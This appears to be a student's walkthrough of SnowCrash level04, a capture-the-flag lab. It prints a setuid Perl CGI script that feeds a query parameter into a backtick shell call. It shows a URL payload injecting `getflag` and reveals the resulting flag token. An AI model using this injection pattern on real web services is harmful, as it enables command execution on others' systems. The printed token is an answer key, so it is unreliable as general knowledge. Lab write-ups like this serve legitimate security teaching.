For this level as usual we can do a basic "ls -l" command, and we something similar to previous level
The level04.pl file is owned by flag04.
So user level04 can execute it as flag04.

	level04@SnowCrash:~$ ls -l
	total 4
	-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

We can already tell that this is a pearl script by this .pl extension.
Now we need to understand what does this program.

level04@SnowCrash:~$ ./level04.pl
Content-type: text/html


	level04@SnowCrash:~$ cat level04.pl
	#!/usr/bin/perl
	# localhost:4747 							tell use that we need to use port 4747.
	use CGI qw{param};							The CGI module is used to handle web requests and responses, and param is used to 
												retrieve parameters passed via the query string or form data.
	print "Content-type: text/html\n\n";
	sub x {
	  $y = $_[0];								in pearl the @_ array store the first argument.
	  print `echo $y 2>&1`;
	}
	x(param("x"));

To resume this script run on a web server. 
It listens for an HTTP request, extracts a parameter from the query string,
and then executes a system command based on that parameter.

This script is highly vulnerable to command injection.
Since it directly passes user input to the shell without any sanitization

Then when we do this request on our browser "http://192.168.1.11:4747/level04.pl?x=`getflag`".
(192.168.1.11 is the ip address of my VM right now, not going to be the same on the evaluation)

We get this response "Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap"
